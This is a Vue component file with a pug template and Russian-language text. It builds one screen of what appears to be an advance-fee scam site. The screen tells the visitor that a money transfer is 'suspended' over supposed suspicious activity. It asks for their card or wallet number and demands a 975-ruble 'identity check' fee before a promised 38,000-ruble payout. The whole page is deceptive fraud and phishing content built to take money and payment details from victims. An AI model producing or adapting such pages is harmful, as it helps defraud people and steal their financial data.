<template lang='pug'>
    .step
        .step__top
            .step__top-left.step__top-left_pause
                span.step__top-icon
                    svg(xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" height="140" viewBox="0 0 357 357" xml:space="preserve")
                        path(d="M25.5,357h102V0h-102V357z M229.5,0v357h102V0H229.5z")

            .step__top-right
                .step__top-heading ВАШ ПЕРЕВОД ПРИОСТАНОВЛЕН

                .step__top-desc Оставайтесь на странице во время работы системы

                .step__top-t2 В вашем сетевом потоке замечана подозрительная активность. Кто-то пытался подменить счет получателя перевода. Чтобы получить деньги, повторно укажите, ваши платежные данные и пройдите проверку. сотрудник службы безопасности проверит все данные. Сразу после проверки вам будет отправлен денежный перевод.

        .step__bot
            .step__bot-header ВЫВОД СРЕДСТВ

            .step__bot-body
                ul.step__bot-balans.list
                    li.step__bot-account
                        span.step__bot-account-bg
                            img(src="~img/images/account-img.svg")

                        span.step__bot-account-title Счет№:

                        span.step__bot-account-value 1773569865 

                    li.step__bot-sum
                        span.step__bot-sum-bg
                            img(src="~img/images/coint-img.svg")

                        span.step__bot-sum-title Баланс счета:

                        span.step__bot-sum-value 37458 руб

                p.step__bot-t1 Статус: <span class="red"> Приостановлен</span>

                p.step__bot-t2 <span class="black">Для сохранности ваших денег, перевод приостановлен. <br />Укажите повторно ваши платежные данные и <br />пройдите проверку</span>

                p.step__bot-t2 Подтверждение личности инспектором: <span class="blue bold large">975 руб</span>

                .step__bot-form
                    .step__bot-group
                        label.step__bot-lbl Куда отправить перевод
                        input.step__bot-field(type="text")

                    .step__bot-group 
                        label.step__bot-lbl Номер карты / кошелька
                        input.step__bot-field(type="text")

                router-link.step__bot-submit.link(:to="{ name: 'unpause' }") ПРОЙТИ ПРОВЕРКУ

                .step__bot-footer Сразу после оплаты комиссии, <br />вам будет отправлен перевод в сумме: 38000 руб.
</template>

<script src='./script.js'></script>

<style lang='scss' src='../firstStep/style.scss'></style>